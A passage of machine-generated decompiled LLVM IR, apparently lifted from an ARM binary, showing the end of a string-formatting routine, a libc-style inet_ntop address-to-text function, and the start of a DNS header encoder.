dec_label_pc_19068:                               ; preds = %dec_label_pc_1901c.dec_label_pc_19068_crit_edge, %bb, %dec_label_pc_19044
  %v1_19078 = phi i32 [ %v1_19078.pre, %dec_label_pc_1901c.dec_label_pc_19068_crit_edge ], [ %v1_1903c, %bb ], [ %v1_19064, %dec_label_pc_19044 ]
  %v0_19068 = load i32, i32* %sb.global-to-local, align 4
  %v1_19068 = inttoptr i32 %v0_19068 to i8*
  %v2_19068 = load i8, i8* %v1_19068, align 1
  %tmp17 = urem i8 %v2_19068, 10
  store i32 %v2_1909c, i32* %ip.global-to-local, align 4
  %v1_1907c = add i32 %v1_19078, 1
  store i32 %v1_1907c, i32* %r1.global-to-local, align 4
  %v1_19080 = or i8 %tmp17, 48
  %v3_19084 = add i32 %v2_19078, %v1_19078
  %v4_19084 = inttoptr i32 %v3_19084 to i8*
  store i8 %v1_19080, i8* %v4_19084, align 1
  %v0_19088 = load i32, i32* %ip.global-to-local, align 4
  %v1_19088 = load i32, i32* %r1.global-to-local, align 4
  %v2_19088 = add i32 %v1_19088, %v0_19088
  store i32 %v2_19088, i32* %r2.global-to-local, align 4
  %v3_19090 = add i32 %v2_19088, -17
  %v4_19090 = inttoptr i32 %v3_19090 to i8*
  store i8 46, i8* %v4_19090, align 1
  %v0_19094 = load i32, i32* %r8.global-to-local, align 4
  %v1_19094 = add i32 %v0_19094, 1
  store i32 %v1_19094, i32* %r8.global-to-local, align 4
  %v0_19098 = load i32, i32* %r1.global-to-local, align 4
  %v1_19098 = add i32 %v0_19098, 1
  br label %dec_label_pc_1909c

dec_label_pc_1909c:                               ; preds = %entry, %dec_label_pc_19068
  %v0_18fe8 = phi i32 [ 0, %entry ], [ %v1_19098, %dec_label_pc_19068 ]
  %v1_18fe4 = phi i32 [ 0, %entry ], [ %v1_19094, %dec_label_pc_19068 ]
  store i32 %v2_1909c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_18fe8, i32* %r6.global-to-local, align 4
  %v2_190ac = add i32 %v0_18fe8, %v2_1909c
  store i32 %v2_190ac, i32* %r5.global-to-local, align 4
  %v7_190b0 = icmp sgt i32 %v1_18fe4, 3
  br i1 %v7_190b0, label %dec_label_pc_190b4, label %dec_label_pc_18fe4

dec_label_pc_190b4:                               ; preds = %dec_label_pc_1909c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_18fc0, i32* %r4.global-to-local, align 4
  %v3_190bc = add i32 %v2_190ac, -18
  %v4_190bc = inttoptr i32 %v3_190bc to i8*
  store i8 0, i8* %v4_190bc, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_190c4 = call i32 @strlen(i8* %tmp18)
  %v2_190c8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_190c4, %v2_190c8
  br i1 %tmp, label %dec_label_pc_190d4, label %dec_label_pc_190e8

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190b4
  %v0_190d4 = call i32 @__errno_location()
  %v0_190dc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_190dc, i32* %r2.global-to-local, align 4
  %v2_190e0 = inttoptr i32 %v0_190d4 to i32*
  store i32 28, i32* %v2_190e0, align 4
  %v0_190f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190f8

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190b4
  store i32 %v2_18fc0, i32* %r1.global-to-local, align 4
  %v3_190f0 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_190f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190f8

dec_label_pc_190f8:                               ; preds = %dec_label_pc_190d4, %dec_label_pc_190e8
  %v0_190f8 = phi i32 [ %v0_190f8.pre, %dec_label_pc_190d4 ], [ %v3_190f0, %dec_label_pc_190e8 ]
  %v2_19100 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19100, i32* @r4, align 4
  ret i32 %v0_190f8

; uselistorder directives
  uselistorder i32 %v2_190ac, { 0, 2, 1 }
  uselistorder i32 %v1_18fe4, { 1, 0 }
  uselistorder i32 %v0_18fe8, { 0, 2, 1 }
  uselistorder i32 %v2_1909c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_190f8, { 1, 0 }
  uselistorder label %dec_label_pc_1909c, { 1, 0 }
  uselistorder label %dec_label_pc_19068, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19108 = load i32, i32* @r4, align 4
  store i32 %v3_19108, i32* %stack_var_-32, align 4
  %v6_19108 = load i32, i32* @r5, align 4
  %v25_19108 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1910c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1910c, label %dec_label_pc_19130, label %dec_label_pc_19124

dec_label_pc_19124:                               ; preds = %entry
  %v7_19124 = icmp eq i32 %arg1, 10
  br i1 %v7_19124, label %dec_label_pc_19144, label %dec_label_pc_19344

dec_label_pc_19130:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1913c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1933c

dec_label_pc_19144:                               ; preds = %dec_label_pc_19124
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_19150 = bitcast i32* %stack_var_-64 to i8*
  %v3_19150 = call i32 @__GI_memset(i8* %v2_19150, i32 0)
  br label %dec_label_pc_19170

dec_label_pc_1915c:                               ; preds = %dec_label_pc_19170
  %tmp68 = icmp slt i32 %v1_19160, 0
  %v4_19170 = zext i1 %tmp68 to i32
  %v5_19170 = add i32 %v4_19170, %v1_19160
  %v3_19174 = sdiv i32 %v5_19170, 2
  %v4_19184 = mul i32 %v3_19174, 4
  %v5_19184 = add i32 %v4_19184, %v25_19108
  %v1_1915c = add i32 %v2_19180, 1
  %v2_1915c = inttoptr i32 %v1_1915c to i8*
  %v3_1915c = load i8, i8* %v2_1915c, align 1
  %v4_1915c = zext i8 %v3_1915c to i32
  %v3_19160 = inttoptr i32 %v2_19180 to i8*
  %v4_19160 = load i8, i8* %v3_19160, align 1
  %v6_19160 = zext i8 %v4_19160 to i32
  store i32 %v6_19160, i32* %r2.global-to-local, align 4
  %v4_19164 = mul nuw nsw i32 %v6_19160, 256
  %v5_19164 = or i32 %v4_19164, %v4_1915c
  %v2_19168 = add i32 %v5_19184, -32
  %v3_19168 = inttoptr i32 %v2_19168 to i32*
  store i32 %v5_19164, i32* %v3_19168, align 4
  %v0_1916c = load i32, i32* %r1.global-to-local, align 4
  %v1_1916c = add i32 %v0_1916c, 2
  br label %dec_label_pc_19170

dec_label_pc_19170:                               ; preds = %dec_label_pc_19144, %dec_label_pc_1915c
  %v1_19160 = phi i32 [ 0, %dec_label_pc_19144 ], [ %v1_1916c, %dec_label_pc_1915c ]
  store i32 %v1_19160, i32* %r1.global-to-local, align 4
  %v0_19180 = load i32, i32* @r8, align 4
  %v2_19180 = add i32 %v0_19180, %v1_19160
  store i32 %v2_19180, i32* %r2.global-to-local, align 4
  %v7_19188 = icmp sgt i32 %v1_19160, 15
  br i1 %v7_19188, label %dec_label_pc_1918c, label %dec_label_pc_1915c

dec_label_pc_1918c:                               ; preds = %dec_label_pc_19170
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1919c

dec_label_pc_1919c:                               ; preds = %dec_label_pc_1918c, %dec_label_pc_191e8
  %v0_191dc = phi i32 [ -1, %dec_label_pc_1918c ], [ %v0_19210, %dec_label_pc_191e8 ]
  %v0_191cc = phi i32 [ -1, %dec_label_pc_1918c ], [ %v0_191fc, %dec_label_pc_191e8 ]
  %v0_191b0 = phi i32 [ -1, %dec_label_pc_1918c ], [ %v0_191b08, %dec_label_pc_191e8 ]
  %v0_191e8 = phi i32 [ 0, %dec_label_pc_1918c ], [ %v1_191e8, %dec_label_pc_191e8 ]
  %v4_191a0 = mul nuw nsw i32 %v0_191e8, 4
  %v5_191a0 = add i32 %v4_191a0, %v25_19108
  %v1_191a4 = add i32 %v5_191a0, -32
  %v2_191a4 = inttoptr i32 %v1_191a4 to i32*
  %v3_191a4 = load i32, i32* %v2_191a4, align 4
  %v2_191a8 = icmp eq i32 %v3_191a4, 0
  %v7_191b0 = icmp eq i32 %v0_191b0, -1
  br i1 %v2_191a8, label %dec_label_pc_191b0, label %dec_label_pc_191c4

dec_label_pc_191b0:                               ; preds = %dec_label_pc_1919c
  br i1 %v7_191b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_191b0
  store i32 %v0_191e8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_191e8

.thread:                                          ; preds = %dec_label_pc_191b0
  %v1_191bc.pre = load i32, i32* @r4, align 4
  %v2_191bc = add i32 %v1_191bc.pre, 1
  store i32 %v2_191bc, i32* @r4, align 4
  br label %dec_label_pc_191e8

dec_label_pc_191c4:                               ; preds = %dec_label_pc_1919c
  br i1 %v7_191b0, label %dec_label_pc_191e8, label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191c4
  %v7_191cc = icmp eq i32 %v0_191cc, -1
  %v0_191e0.pre = load i32, i32* @r4, align 4
  %v1_191d4 = load i32, i32* @r7, align 4
  %v7_191d8 = icmp sgt i32 %v0_191e0.pre, %v1_191d4
  %or.cond = or i1 %v7_191cc, %v7_191d8
  br i1 %or.cond, label %dec_label_pc_191dc, label %dec_label_pc_191e4

dec_label_pc_191dc:                               ; preds = %dec_label_pc_191cc
  store i32 %v0_191dc, i32* @r6, align 4
  store i32 %v0_191e0.pre, i32* @r7, align 4
  br label %dec_label_pc_191e4

dec_label_pc_191e4:                               ; preds = %dec_label_pc_191cc, %dec_label_pc_191dc
  %v0_191cc13 = phi i32 [ %v0_191dc, %dec_label_pc_191dc ], [ %v0_191cc, %dec_label_pc_191cc ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_191e8

dec_label_pc_191e8:                               ; preds = %bb, %.thread, %dec_label_pc_191c4, %dec_label_pc_191e4
  %v0_19210 = phi i32 [ %v0_191dc, %.thread ], [ %v0_191e8, %bb ], [ %v0_191dc, %dec_label_pc_191c4 ], [ -1, %dec_label_pc_191e4 ]
  %v0_191b08 = phi i32 [ %v0_191b0, %.thread ], [ %v0_191e8, %bb ], [ -1, %dec_label_pc_191c4 ], [ -1, %dec_label_pc_191e4 ]
  %v0_191fc = phi i32 [ %v0_191cc, %.thread ], [ %v0_191cc, %bb ], [ %v0_191cc, %dec_label_pc_191c4 ], [ %v0_191cc13, %dec_label_pc_191e4 ]
  %v1_191e8 = add nuw nsw i32 %v0_191e8, 1
  store i32 %v1_191e8, i32* %r1.global-to-local, align 4
  %v7_191f0 = icmp slt i32 %v1_191e8, 8
  br i1 %v7_191f0, label %dec_label_pc_1919c, label %dec_label_pc_191f4

dec_label_pc_191f4:                               ; preds = %dec_label_pc_191e8
  %v7_191f4 = icmp eq i32 %v0_19210, -1
  br i1 %v7_191f4, label %dec_label_pc_19214, label %dec_label_pc_191fc

dec_label_pc_191fc:                               ; preds = %dec_label_pc_191f4
  %v7_191fc = icmp eq i32 %v0_191fc, -1
  %v0_1920c.pre = load i32, i32* @r4, align 4
  br i1 %v7_191fc, label %dec_label_pc_1920c, label %dec_label_pc_19204

dec_label_pc_19204:                               ; preds = %dec_label_pc_191fc
  %v1_19204 = load i32, i32* @r7, align 4
  %v7_19208 = icmp sgt i32 %v0_1920c.pre, %v1_19204
  br i1 %v7_19208, label %dec_label_pc_1920c, label %dec_label_pc_19214

dec_label_pc_1920c:                               ; preds = %dec_label_pc_191fc, %dec_label_pc_19204
  store i32 %v0_1920c.pre, i32* @r7, align 4
  store i32 %v0_19210, i32* @r6, align 4
  br label %dec_label_pc_19214

dec_label_pc_19214:                               ; preds = %dec_label_pc_19204, %dec_label_pc_191f4, %dec_label_pc_1920c
  %v0_19214 = phi i32 [ %v0_191fc, %dec_label_pc_19204 ], [ %v0_191fc, %dec_label_pc_191f4 ], [ %v0_19210, %dec_label_pc_1920c ]
  %v7_19214 = icmp eq i32 %v0_19214, -1
  br i1 %v7_19214, label %bb49, label %dec_label_pc_1921c

dec_label_pc_1921c:                               ; preds = %dec_label_pc_19214
  %v0_1921c = load i32, i32* @r7, align 4
  %v7_19220 = icmp slt i32 %v0_1921c, 2
  br i1 %v7_19220, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1921c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_19214, %dec_label_pc_1921c, %bb48
  %v0_1923023 = phi i32 [ %v0_19214, %dec_label_pc_19214 ], [ %v0_19214, %dec_label_pc_1921c ], [ -1, %bb48 ]
  %v2_19224 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_19224, i32* @r4, align 4
  %v9_19290 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1923063 = icmp eq i32 %v0_1923023, -1
  br label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %bb49, %dec_label_pc_192e4
  %v7_1923067 = phi i1 [ %v7_1923063, %bb49 ], [ %v7_19230, %dec_label_pc_192e4 ]
  %v0_1925c66 = phi i32 [ 0, %bb49 ], [ %v1_192e4, %dec_label_pc_192e4 ]
  %v1_1924c65 = phi i32 [ %v0_1923023, %bb49 ], [ %v0_19230.pre, %dec_label_pc_192e4 ]
  %v3_1926464 = phi i32 [ %v2_19224, %bb49 ], [ %v3_1925424, %dec_label_pc_192e4 ]
  br i1 %v7_1923067, label %dec_label_pc_1925c, label %dec_label_pc_19238

dec_label_pc_19238:                               ; preds = %dec_label_pc_19230
  %v9_19238 = icmp eq i32 %v0_1925c66, %v1_1924c65
  %v5_1923c = icmp slt i32 %v0_1925c66, %v1_1924c65
  br i1 %v5_1923c, label %dec_label_pc_1925c, label %dec_label_pc_19240

dec_label_pc_19240:                               ; preds = %dec_label_pc_19238
  %v1_19240 = load i32, i32* @r7, align 4
  %v2_19240 = add i32 %v1_19240, %v1_1924c65
  %v6_19248 = icmp slt i32 %v0_1925c66, %v2_19240
  br i1 %v6_19248, label %dec_label_pc_1924c, label %dec_label_pc_1925c

dec_label_pc_1924c:                               ; preds = %dec_label_pc_19240
  br i1 %v9_19238, label %bb51, label %dec_label_pc_192e4

bb51:                                             ; preds = %dec_label_pc_1924c
  %v4_19254 = inttoptr i32 %v3_1926464 to i8*
  store i8 58, i8* %v4_19254, align 1
  %v5_19254 = load i32, i32* @r4, align 4
  %v6_19254 = add i32 %v5_19254, 1
  store i32 %v6_19254, i32* @r4, align 4
  br label %dec_label_pc_192e4

dec_label_pc_1925c:                               ; preds = %dec_label_pc_19240, %dec_label_pc_19238, %dec_label_pc_19230
  %v2_1925c = icmp eq i32 %v0_1925c66, 0
  br i1 %v2_1925c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1925c
  %v4_19264 = inttoptr i32 %v3_1926464 to i8*
  store i8 58, i8* %v4_19264, align 1
  %v5_19264 = load i32, i32* @r4, align 4
  %v6_19264 = add i32 %v5_19264, 1
  store i32 %v6_19264, i32* @r4, align 4
  %v0_19268.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1925c, %bb52
  %v0_192a8 = phi i32 [ %v3_1926464, %dec_label_pc_1925c ], [ %v6_19264, %bb52 ]
  %v1_192cc = phi i32 [ 0, %dec_label_pc_1925c ], [ %v0_19268.pre, %bb52 ]
  %v7_19268 = icmp eq i32 %v1_192cc, 6
  br i1 %v7_19268, label %dec_label_pc_19270, label %dec_label_pc_192c8

dec_label_pc_19270:                               ; preds = %.thread3
  %v0_19270 = load i32, i32* @r6, align 4
  %v2_19270 = icmp eq i32 %v0_19270, 0
  br i1 %v2_19270, label %dec_label_pc_19278, label %dec_label_pc_192c8

dec_label_pc_19278:                               ; preds = %dec_label_pc_19270
  %v0_19278 = load i32, i32* @r7, align 4
  %v7_19278 = icmp eq i32 %v0_19278, 6
  br i1 %v7_19278, label %dec_label_pc_19298, label %dec_label_pc_19280

dec_label_pc_19280:                               ; preds = %dec_label_pc_19278
  %v7_19280 = icmp eq i32 %v0_19278, 5
  br i1 %v7_19280, label %dec_label_pc_19288, label %dec_label_pc_192c8

dec_label_pc_19288:                               ; preds = %dec_label_pc_19280
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_19290, label %dec_label_pc_19298, label %dec_label_pc_192c8

dec_label_pc_19298:                               ; preds = %dec_label_pc_19288, %dec_label_pc_19278
  %v2_1929c = sub i32 %v25_19108, %v0_192a8
  %v0_192a0 = load i32, i32* @r8, align 4
  %v1_192a0 = add i32 %v0_192a0, 12
  %v1_192a4 = add i32 %v2_1929c, -32
  store i32 %v1_192a4, i32* %r2.global-to-local, align 4
  store i32 %v0_192a8, i32* %r1.global-to-local, align 4
  %v3_192ac = call i32 @inet_ntop4(i32 %v1_192a0, i32 %v0_192a8, i32 %v1_192a4)
  %v2_192b0 = icmp eq i32 %v3_192ac, 0
  br i1 %v2_192b0, label %dec_label_pc_1933c, label %dec_label_pc_192b8

dec_label_pc_192b8:                               ; preds = %dec_label_pc_19298
  %v0_192b8 = load i32, i32* @r4, align 4
  %v1_192b8 = inttoptr i32 %v0_192b8 to i8*
  %v3_192bc = call i32 @strlen(i8* %v1_192b8)
  %v0_192c0 = load i32, i32* @r4, align 4
  %v2_192c0 = add i32 %v0_192c0, %v3_192bc
  store i32 %v2_192c0, i32* @r4, align 4
  %v0_192f8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_192f8

dec_label_pc_192c8:                               ; preds = %dec_label_pc_19288, %dec_label_pc_19280, %dec_label_pc_19270, %.thread3
  %v4_192cc = mul i32 %v1_192cc, 4
  %v5_192cc = add i32 %v4_192cc, %v25_19108
  store i32 %v0_192a8, i32* @r0, align 4
  %v1_192d4 = add i32 %v5_192cc, -32
  %v2_192d4 = inttoptr i32 %v1_192d4 to i32*
  %v3_192d4 = load i32, i32* %v2_192d4, align 4
  store i32 %v3_192d4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_242dc.1344 to i32), i32* %r1.global-to-local, align 4
  %v7_192dc = call i32 @sprintf(i32 %v0_192a8, i32 ptrtoint ([3 x i8]* @global_var_242dc.1344 to i32), i32 %v3_192d4, i32 %v5_192cc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_192e0 = load i32, i32* @r4, align 4
  %v2_192e0 = add i32 %v0_192e0, %v7_192dc
  store i32 %v2_192e0, i32* @r4, align 4
  br label %dec_label_pc_192e4

dec_label_pc_192e4:                               ; preds = %dec_label_pc_1924c, %bb51, %dec_label_pc_192c8
  %v3_1925424 = phi i32 [ %v3_1926464, %dec_label_pc_1924c ], [ %v6_19254, %bb51 ], [ %v2_192e0, %dec_label_pc_192c8 ]
  %v0_192e4 = load i32, i32* @r5, align 4
  %v1_192e4 = add i32 %v0_192e4, 1
  %v0_19230.pre = load i32, i32* @r6, align 4
  store i32 %v1_192e4, i32* @r5, align 4
  %v7_192ec = icmp slt i32 %v1_192e4, 8
  %v7_19230 = icmp eq i32 %v0_19230.pre, -1
  br i1 %v7_192ec, label %dec_label_pc_19230, label %dec_label_pc_192f0

dec_label_pc_192f0:                               ; preds = %dec_label_pc_192e4
  br i1 %v7_19230, label %.thread4, label %dec_label_pc_192f8

dec_label_pc_192f8:                               ; preds = %dec_label_pc_192f0, %dec_label_pc_192b8
  %v3_19304 = phi i32 [ %v3_1925424, %dec_label_pc_192f0 ], [ %v2_192c0, %dec_label_pc_192b8 ]
  %v0_192f8 = phi i32 [ %v0_19230.pre, %dec_label_pc_192f0 ], [ %v0_192f8.pre, %dec_label_pc_192b8 ]
  %v1_192f8 = load i32, i32* @r7, align 4
  %v2_192f8 = add i32 %v1_192f8, %v0_192f8
  %v7_192fc = icmp eq i32 %v2_192f8, 8
  br i1 %v7_192fc, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_192f8
  %v4_19304 = inttoptr i32 %v3_19304 to i8*
  store i8 58, i8* %v4_19304, align 1
  %v5_19304 = load i32, i32* @r4, align 4
  %v6_19304 = add i32 %v5_19304, 1
  store i32 %v6_19304, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_192f8, %dec_label_pc_192f0, %bb53
  %v2_1930c = phi i32 [ %v3_19304, %dec_label_pc_192f8 ], [ %v3_1925424, %dec_label_pc_192f0 ], [ %v6_19304, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1930c = inttoptr i32 %v2_1930c to i8*
  store i8 0, i8* %v3_1930c, align 1
  %v4_1930c = load i32, i32* @r4, align 4
  %v5_1930c = add i32 %v4_1930c, 1
  store i32 %v2_19224, i32* %r1.global-to-local, align 4
  %v2_19314 = sub i32 %v5_1930c, %v2_19224
  %v1_19318 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_19314, %v1_19318
  br i1 %tmp69, label %dec_label_pc_19320, label %dec_label_pc_19334

dec_label_pc_19320:                               ; preds = %.thread4
  %v0_19320 = call i32 @__errno_location()
  %v0_19328 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19328, i32* %r2.global-to-local, align 4
  %v2_1932c = inttoptr i32 %v0_19320 to i32*
  store i32 28, i32* %v2_1932c, align 4
  %v0_19354.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19354

dec_label_pc_19334:                               ; preds = %.thread4
  %v0_19334 = load i32, i32* @sb, align 4
  %v2_19338 = bitcast i32* %stack_var_-110 to i8*
  %v3_19338 = call i32 @strcpy(i32 %v0_19334, i8* %v2_19338)
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_19298, %dec_label_pc_19130, %dec_label_pc_19334
  %v0_1933c = phi i32 [ 0, %dec_label_pc_19298 ], [ %v3_1913c, %dec_label_pc_19130 ], [ %v3_19338, %dec_label_pc_19334 ]
  store i32 %v0_1933c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19354

dec_label_pc_19344:                               ; preds = %dec_label_pc_19124
  %v0_19344 = call i32 @__errno_location()
  %v2_1934c = inttoptr i32 %v0_19344 to i32*
  store i32 97, i32* %v2_1934c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19354

dec_label_pc_19354:                               ; preds = %dec_label_pc_1933c, %dec_label_pc_19320, %dec_label_pc_19344
  %v0_19354 = phi i32 [ %v0_1933c, %dec_label_pc_1933c ], [ %v0_19354.pre, %dec_label_pc_19320 ], [ 0, %dec_label_pc_19344 ]
  store i32 %v6_19108, i32* %r5.global-to-local, align 4
  ret i32 %v0_19354

; uselistorder directives
  uselistorder i1 %v7_19230, { 1, 0 }
  uselistorder i32 %v0_19230.pre, { 1, 0, 2 }
  uselistorder i32 %v1_192e4, { 1, 0, 2 }
  uselistorder i32 %v0_192a8, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1926464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1924c65, { 2, 0, 1 }
  uselistorder i32 %v0_1925c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_19224, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1923023, { 1, 0 }
  uselistorder i32 %v0_19214, { 1, 2, 0 }
  uselistorder i32 %v1_191e8, { 1, 2, 0 }
  uselistorder i32 %v0_191fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19210, { 1, 2, 0, 3 }
  uselistorder i1 %v7_191b0, { 1, 0 }
  uselistorder i32 %v0_191e8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_191cc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_191dc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_19180, { 2, 1, 0 }
  uselistorder i32 %v1_19160, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_19108, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 11, 2, 3, 4, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 13, 14, 15, 7, 26, 24, 20, 25, 8, 2, 3, 4, 5, 6, 9, 10, 11, 12, 16, 17, 18, 19, 23, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19354, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1933c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_192e4, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_19230, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19214, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1920c, { 1, 0 }
  uselistorder label %dec_label_pc_191e8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_191e4, { 1, 0 }
  uselistorder label %dec_label_pc_1919c, { 1, 0 }
  uselistorder label %dec_label_pc_19170, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1936c = load i32, i32* @r4, align 4
  store i32 %v3_1936c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1937c = icmp sgt i32 %arg3, 11
  br i1 %v7_1937c, label %dec_label_pc_19380, label %dec_label_pc_19448

dec_label_pc_19380:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_19380 = add i32 %tmp, 1
  %v2_19380 = inttoptr i32 %v1_19380 to i8*
  %v3_19380 = load i8, i8* %v2_19380, align 1
  store i8 %v3_19380, i8* %tmp18, align 1
  %v2_19388 = load i32, i32* %arg1, align 4
  %v1_1938c = trunc i32 %v2_19388 to i8
  %v4_1938c = add i32 %arg2, 1
  %v5_1938c = inttoptr i32 %v4_1938c to i8*
  store i8 %v1_1938c, i8* %v5_1938c, align 1
  %v0_19390 = load i32, i32* %lr.global-to-local, align 4
  %v1_19390 = add i32 %v0_19390, 12
  %v2_19390 = inttoptr i32 %v1_19390 to i32*
  %v3_19390 = load i32, i32* %v2_19390, align 4
  %v1_19394 = add i32 %v0_19390, 4
  %v2_19394 = inttoptr i32 %v1_19394 to i32*
  %v3_19394 = load i32, i32* %v2_19394, align 4
  %v1_19398 = add i32 %v0_19390, 16
  %v2_19398 = inttoptr i32 %v1_19398 to i32*
  %v3_19398 = load i32, i32* %v2_19398, align 4
  %v1_1939c = add i32 %tmp, 8
  %v2_1939c = inttoptr i32 %v1_1939c to i32*
  %v3_1939c = load i32, i32* %v2_1939c, align 4
  %v2_193a0 = icmp eq i32 %v3_19390, 0
  %. = select i1 %v2_193a0, i32 0, i32 4
  %v2_193ac = icmp eq i32 %v3_19394, 0
  %v1_193b0 = add i32 %v0_19390, 20
  %v2_193b0 = inttoptr i32 %v1_193b0 to i32*
  %v3_193b0 = load i32, i32* %v2_193b0, align 4
  %storemerge12 = select i1 %v2_193ac, i32 0, i32 128
  %v1_193bc = urem i32 %v3_1939c, 16
  %v2_193c0 = icmp eq i32 %v3_19398, 0
  %.29 = select i1 %v2_193c0, i32 0, i32 2
  %v4_193cc = mul nuw nsw i32 %v1_193bc, 8
